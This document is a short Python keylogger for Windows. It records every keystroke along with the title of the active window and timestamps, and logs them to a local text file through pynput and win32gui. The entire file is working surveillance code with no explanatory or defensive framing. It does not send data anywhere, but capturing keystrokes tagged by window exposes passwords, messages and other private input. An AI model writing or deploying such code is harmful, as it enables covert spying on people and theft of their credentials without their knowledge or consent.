from pynput import keyboard
import win32gui
import logging
from datetime import datetime

# File to save logs
LOG_FILE = "advanced_key_log.txt"

# Setup logging configuration
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

current_window = None

def get_active_window_title():
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown Window"

def on_press(key):
    global current_window
    try:
        window_title = get_active_window_title()
        if current_window != window_title:
            current_window = window_title
            logging.info(f"\n\n[Window Changed] {current_window} - {datetime.now()}\n")

        if hasattr(key, 'char') and key.char is not None:
            logging.info(f"{key.char}")
        else:
            logging.info(f"[{key}]")
    except Exception as e:
        logging.error(f"Error: {e}")

# Listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
